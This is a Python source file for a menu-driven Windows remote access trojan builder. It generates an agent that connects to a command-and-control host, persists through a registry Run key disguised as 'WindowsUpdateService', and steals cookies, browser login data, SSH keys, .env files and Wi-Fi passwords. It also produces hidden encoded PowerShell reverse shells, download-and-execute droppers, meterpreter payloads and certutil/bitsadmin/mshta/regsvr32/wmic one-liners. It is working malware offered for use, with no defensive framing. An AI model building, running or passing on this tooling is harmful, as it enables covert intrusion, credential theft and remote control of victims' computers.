#!/usr/bin/env python3
import os, sys, shutil, base64

RED="\033[91m"; YEL="\033[93m"; CYN="\033[96m"; GRN="\033[92m"
WHT="\033[97m"; DIM="\033[2m";  RST="\033[0m"

LOGO = f"""{RED}
  ██╗    ██╗██╗███╗   ██╗    ██████╗  █████╗ ████████╗
  ██║    ██║██║████╗  ██║    ██╔══██╗██╔══██╗╚══██╔══╝
  ██║ █╗ ██║██║██╔██╗ ██║    ██████╔╝███████║   ██║
  ██║███╗██║██║██║╚██╗██║    ██╔══██╗██╔══██║   ██║
  ╚███╔███╔╝██║██║ ╚████║    ██║  ██║██║  ██║   ██║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝{RST}
{DIM}                  [ windows remote access tool ]{RST}
"""

MENU = f"""
{YEL}┌──────────────────────────────────────────────────────┐
│               {WHT}WINDOWS RAT OPTIONS{YEL}                  │
├──────────────────────────────────────────────────────┤
│  {CYN}[1]{YEL}  Generate Python agent (Windows)              │
│  {CYN}[2]{YEL}  Generate EXE payload (msfvenom)              │
│  {CYN}[3]{YEL}  Generate PowerShell reverse shell            │
│  {CYN}[4]{YEL}  Generate PowerShell dropper (download+exec)  │
│  {CYN}[5]{YEL}  Start C2 listener (built-in)                 │
│  {CYN}[6]{YEL}  Start Metasploit listener                    │
│  {CYN}[7]{YEL}  PowerShell one-liners (copy)                 │
│  {CYN}[0]{YEL}  Back                                         │
└──────────────────────────────────────────────────────┘{RST}
"""

# ── Windows Python agent ──────────────────────────────────────────────────────
WIN_AGENT = '''import socket,subprocess,os,threading,time,json,base64,winreg,shutil,sys
C2_HOST="{host}"
C2_PORT={port}

def sh(cmd):
    r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30,
                     creationflags=0x08000000)
    return (r.stdout+r.stderr).decode(errors="replace") or "[no output]"

def persist():
    exe=sys.executable
    key=winreg.OpenKey(winreg.HKEY_CURRENT_USER,
        r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key,"WindowsUpdateService",0,winreg.REG_SZ,f'"{exe}" "{os.path.abspath(__file__)}"')
    winreg.CloseKey(key)

def exfil():
    import glob,pathlib,json
    o={}
    for root,_,files in os.walk(os.path.expandvars("%USERPROFILE%")):
        for f in files:
            if f in ("Cookies","Login Data","id_rsa","credentials","passwords.txt",".env"):
                fp=os.path.join(root,f)
                try: o[fp]=open(fp,"rb").read(8192).decode(errors="replace")
                except: pass
        if len(o)>20: break
    o["whoami"]=sh("whoami /all")
    o["ipconfig"]=sh("ipconfig /all")
    o["env"]=dict(os.environ)
    return json.dumps(o)

def screenshot():
    try:
        import mss,base64
        with mss.mss() as s:
            img=s.grab(s.monitors[0])
            import io
            from PIL import Image
            buf=io.BytesIO()
            Image.frombytes("RGB",img.size,img.rgb).save(buf,"PNG")
            return "PNG_B64:"+base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"[screenshot err] {e}"

def send(s,d):
    p=d.encode();s.sendall(len(p).to_bytes(4,"big")+p)
def recv(s):
    n=int.from_bytes(s.recv(4),"big");d=b""
    while len(d)<n:d+=s.recv(4096)
    return json.loads(d)

def loop(s):
    import platform
    send(s,json.dumps({{"hello":sh("whoami")+" | "+platform.node()+" | "+sh("ver")}}))
    persist()
    while True:
        pkt=recv(s);cmd=pkt.get("cmd","").upper();args=pkt.get("args","")
        if cmd=="EXIT":break
        elif cmd=="SHELL": res=sh(args)
        elif cmd=="EXFIL": res=exfil()
        elif cmd=="SCREENSHOT": res=screenshot()
        elif cmd=="GET":
            try: res="FILE_B64:"+base64.b64encode(open(args,"rb").read()).decode()
            except Exception as e: res=f"[err] {e}"
        elif cmd=="PUT":
            p,b=args.split(":",1);open(p,"wb").write(base64.b64decode(b));res=f"wrote {p}"
        elif cmd=="PERSIST": persist();res="registry persist set"
        elif cmd=="DUMP_WIFI": res=sh("netsh wlan show profiles") + "\\n" + sh("for /f \\"tokens=2 delims=:\\" %a in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile name=%a key=clear")
        else: res=f"unknown: {cmd}"
        send(s,json.dumps({{"status":"ok","data":res}}))

while True:
    try:
        s=socket.socket();s.connect((C2_HOST,C2_PORT));s.settimeout(None);loop(s);s.close()
    except:pass
    time.sleep(15)
'''

# ── PowerShell reverse shell ──────────────────────────────────────────────────
PS_SHELL = """$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});
$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
  $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
  $r=(iex $d 2>&1|Out-String);
  $o=$r+'PS '+(pwd)+'> ';
  $x=([text.encoding]::ASCII).GetBytes($o);
  $s.Write($x,0,$x.Length)
}};$c.Close()"""

PS_DROPPER = """$url='{url}';$out='$env:TEMP\\svc.exe';
(New-Object System.Net.WebClient).DownloadFile($url,$out);
Start-Process -FilePath $out -WindowStyle Hidden;"""

def clear(): os.system("clear")

# ── C2 (shared logic) ─────────────────────────────────────────────────────────
def c2_listener(port):
    import socket,json
    def send_msg(sock,d): p=d.encode();sock.sendall(len(p).to_bytes(4,"big")+p)
    def recv_msg(sock):
        n=int.from_bytes(sock.recv(4),"big");d=b""
        while len(d)<n:d+=sock.recv(4096)
        return d.decode(errors="ignore")
    srv=socket.socket();srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    srv.bind(("0.0.0.0",port));srv.listen(5)
    print(f"\n{GRN}[+] listening :{port}{RST}")
    conn,addr=srv.accept()
    print(f"{GRN}[+] agent from {addr}{RST}")
    hello=json.loads(recv_msg(conn)); print(hello)
    while True:
        try:
            line=input(f"{RED}win-shell{RST} {YEL}>{RST} ").strip()
            if not line:continue
            parts=line.split(None,1);cmd=parts[0].upper();args=parts[1] if len(parts)>1 else ""
            send_msg(conn,json.dumps({"cmd":cmd,"args":args}))
            if cmd=="EXIT":break
            resp=json.loads(recv_msg(conn));data=resp.get("data","")
            print(data[:4000])
            if len(data)>4000: print(f"[...{len(data)-4000} bytes truncated]")
        except(KeyboardInterrupt,BrokenPipeError):break
    conn.close();srv.close()

# ── handlers ──────────────────────────────────────────────────────────────────
def gen_agent():
    lhost=input("  C2 IP: ").strip();lport=input("  C2 PORT [4444]: ").strip() or "4444"
    out=input("  output [win_agent.py]: ").strip() or "win_agent.py"
    open(out,"w").write(WIN_AGENT.format(host=lhost,port=int(lport)))
    print(f"{GRN}[+] written to {out}{RST}")
    input(f"\n{DIM}press enter{RST}")

def gen_exe():
    if not shutil.which("msfvenom"):print(f"{RED}[!] msfvenom not found{RST}");input();return
    lhost=input("  LHOST: ").strip();lport=input("  LPORT [4444]: ").strip() or "4444"
    out=input("  output [payload.exe]: ").strip() or "payload.exe"
    os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > {out}")
    print(f"{GRN}[+] {out}{RST}")
    input(f"\n{DIM}press enter{RST}")

def gen_ps_shell():
    lhost=input("  LHOST: ").strip();lport=input("  LPORT [4444]: ").strip() or "4444"
    ps=PS_SHELL.format(host=lhost,port=lport)
    enc=base64.b64encode(ps.encode("utf-16-le")).decode()
    one=f"powershell -nop -w hidden -enc {enc}"
    print(f"\n{CYN}[ RAW POWERSHELL ]{RST}\n{DIM}{ps}{RST}")
    print(f"\n{CYN}[ ENCODED ONE-LINER ]{RST}\n{GRN}{one}{RST}")
    out=input("\n  save to file? (blank=skip): ").strip()
    if out:
        open(out,"w").write(ps)
        open(out+".enc","w").write(one)
        print(f"{GRN}[+] saved {out} + {out}.enc{RST}")
    input(f"\n{DIM}press enter{RST}")

def gen_dropper():
    url=input("  payload URL (http://x.x.x.x/payload.exe): ").strip()
    ps=PS_DROPPER.format(url=url)
    enc=base64.b64encode(ps.encode("utf-16-le")).decode()
    print(f"\n{CYN}[ DROPPER ]{RST}\n{DIM}{ps}{RST}")
    print(f"\n{CYN}[ ENCODED ]{RST}\n{GRN}powershell -nop -w hidden -enc {enc}{RST}")
    input(f"\n{DIM}press enter{RST}")

def start_c2():
    port=input("  port [4444]: ").strip() or "4444"
    c2_listener(int(port))
    input(f"\n{DIM}press enter{RST}")

def msf_listener():
    if not shutil.which("msfconsole"):print(f"{RED}[!] msfconsole not found{RST}");input();return
    lhost=input("  LHOST: ").strip();lport=input("  LPORT [4444]: ").strip() or "4444"
    rc="/tmp/syp_win.rc"
    open(rc,"w").write(f"use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nexploit\n")
    os.system(f"msfconsole -r {rc}")
    input(f"\n{DIM}press enter{RST}")

def ps_oneliners():
    lhost=input("  LHOST: ").strip();lport=input("  LPORT [4444]: ").strip() or "4444"
    lines=[
        ("PS reverse shell (encoded)", f"powershell -nop -w hidden -enc {base64.b64encode(PS_SHELL.format(host=lhost,port=lport).encode('utf-16-le')).decode()}"),
        ("cmd.exe via certutil dl+exec",f"certutil -urlcache -f http://{lhost}/shell.exe %TEMP%\\s.exe && %TEMP%\\s.exe"),
        ("bitsadmin dl+exec",           f"bitsadmin /transfer j http://{lhost}/shell.exe %TEMP%\\s.exe && %TEMP%\\s.exe"),
        ("mshta vbs inline",            f"mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -nop -w hidden -c '$c=New-Object Net.Sockets.TCPClient(\\\"{lhost}\\\",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$x=([text.encoding]::ASCII).GetBytes($r+\\\"PS\\\"+(pwd)+\\\"> \\\");$s.Write($x,0,$x.Length)}}'\",0,True)(window.close)"),
        ("regsvr32 SCT",               f"regsvr32 /s /n /u /i:http://{lhost}/shell.sct scrobj.dll"),
        ("wmic xsl exec",               f"wmic os get /format:\"http://{lhost}/shell.xsl\""),
    ]
    print(f"\n{CYN}[ WINDOWS ONE-LINERS ]{RST}  LHOST={lhost} LPORT={lport}\n")
    for name,cmd in lines:
        print(f"  {YEL}{name}{RST}"); print(f"  {DIM}{cmd}{RST}\n")
    input(f"{DIM}press enter{RST}")

ACTIONS={"1":gen_agent,"2":gen_exe,"3":gen_ps_shell,"4":gen_dropper,"5":start_c2,"6":msf_listener,"7":ps_oneliners}

def main():
    while True:
        clear();print(LOGO);print(MENU)
        c=input(f"{RED}rat-windows{RST} {YEL}>{RST} ").strip()
        if c=="0":break
        if c in ACTIONS:ACTIONS[c]()
        else:input(f"{YEL}[?] invalid — enter{RST}")

if __name__=="__main__":main()
